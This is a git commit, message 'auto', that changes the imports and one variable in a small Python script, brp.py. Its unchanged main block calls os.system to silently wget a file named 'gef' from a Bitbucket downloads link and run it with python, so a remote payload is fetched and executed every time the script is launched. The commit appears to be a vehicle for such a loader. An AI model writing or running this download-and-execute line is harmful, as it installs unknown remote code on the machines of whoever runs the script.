947786f0c7924c34816f5167e97fa91327cd481f
Your Name <you@example.com>
2024-10-09 04:11:05 +0200

    auto

--- brp.py
+++ brp.py
@@ -1,4 +1,4 @@
-import sys,os,multiprocessing
-g=7
+import sys,os,argparse
+t=13
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
